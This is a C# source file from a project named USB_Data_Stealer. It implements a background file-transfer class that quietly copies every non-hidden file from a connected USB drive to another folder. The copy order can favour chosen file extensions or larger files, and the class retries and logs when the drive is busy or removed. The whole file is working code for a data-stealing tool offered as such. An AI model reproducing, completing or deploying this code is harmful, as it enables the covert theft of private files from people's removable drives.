using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using USB_Data_Stealer.Core.Logging;

namespace USB_Data_Stealer.Core
{
    partial class UsbStealer
    {
        private class FileTransfer
        {
            internal FileTransfer(string inputPath, string outputPath, FileTransfererSettings fileTransfererSettings)
            {
                SourceDirectory = new DirectoryInfo(inputPath);
                TargetDirectory = new DirectoryInfo(outputPath);
                FileTransferSettings = fileTransfererSettings;
                InstanceId = Guid.NewGuid();
            }

            private FileTransfererSettings FileTransferSettings { get; }
            private DirectoryInfo SourceDirectory { get; }
            private DirectoryInfo TargetDirectory { get; }
            public CopyProgressChanged CopyProgressChanged { get; set; }
            public CopyProgressFinished CopyProgressFinished { get; set; }
            public CopyProgressStarted CopyProgressStarted { get; set; }
            internal IEnumerable<string> PrecedenceExtensions { private get; set; }

            private Guid InstanceId { get; }

            public void BeginTransfer()
            {
                var thread = new Thread(Transfer) {IsBackground = true};
                thread.Start();
            }

            private void Transfer()
            {
                IEnumerable<FileInfo> files = GetAllAccessibleFiles(SourceDirectory.FullName).ToArray();
                var nFilesCopied = 0;
                int nFiles = files.Count();

                if (FileTransferSettings.PrecedenceExtensions.Length > 0)
                {
                    files =
                        files.OrderByDescending(
                            f => PrecedenceExtensions.Contains(f.Extension, StringComparer.CurrentCultureIgnoreCase));
                }
                if (FileTransferSettings.CopyBySize)
                {
                    files = files.OrderByDescending(s => s.Length);
                }

                CopyProgressStarted?.Invoke(InstanceId);
                foreach (FileInfo file in files)
                {
                    try
                    {
                        TransferFile(file);
                    }
                    catch (Exception ex)
                    {
                        if (ex.HResult == -2147023890)
                        {
                            Logger.Append(new Message(Message.EventTypes.Error,
                                "Drive disconnected before File transfer operation finished (" +
                                (int) (nFilesCopied*100.0/nFiles) + "%)."));
                            break;
                        }
                        var a = 0;
                        //Errore durante la creazione della cartella di destinazione oppure durante il trasferimento (file non trovato etc.)
                    }
                    CopyProgressChanged?.Invoke((int) (nFilesCopied++*100.0/nFiles), InstanceId);
                }
                CopyProgressFinished?.Invoke(InstanceId);
                Logger.Append(new Message(Message.EventTypes.Info,
                    "Data transferring from  \"" + SourceDirectory.Root.FullName + "\" to \"" + TargetDirectory +
                    "\" finished."));
            }

            private void TransferFile(FileInfo file)
            {
                if (file.Directory == null) return;
                string directoryNoRoot = file.Directory.FullName.Remove(0, SourceDirectory.Root.Name.Length);

                Directory.CreateDirectory(Path.Combine(TargetDirectory.FullName, directoryNoRoot));

                try
                {
                    file.CopyTo(
                        Path.Combine(TargetDirectory.FullName,
                            Path.Combine(TargetDirectory.FullName, directoryNoRoot, file.Name)), true);
                }
                catch (Exception ex)
                {
                    if (ex.HResult == -2147024875)
                    {
                        //Device not ready, try again
                        Thread.Sleep(100);
                        TransferFile(file);
                    }
                    else throw;
                }
            }

            private static List<FileInfo> GetAllAccessibleFiles(string rootPath, List<FileInfo> alreadyFound = null)
            {
                if (alreadyFound == null) alreadyFound = new List<FileInfo>();
                var di = new DirectoryInfo(rootPath);
                var dirs = di.EnumerateDirectories();
                alreadyFound =
                    dirs
                        .Where(dir => (dir.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
                        .Aggregate(alreadyFound, (current, dir) => GetAllAccessibleFiles(dir.FullName, current));
                //.Where(
                //dir =>
                //dir.Attributes != FileAttributes.SparseFile && dir.Attributes != FileAttributes.System && dir.Attributes != FileAttributes.Temporary && dir.Attributes != FileAttributes.IntegrityStream && dir.Attributes != FileAttributes.Device)
                var files = Directory.GetFiles(rootPath);
                alreadyFound.AddRange(files.Select(file => new FileInfo(file)));

                return alreadyFound;
            }
        }
    }
}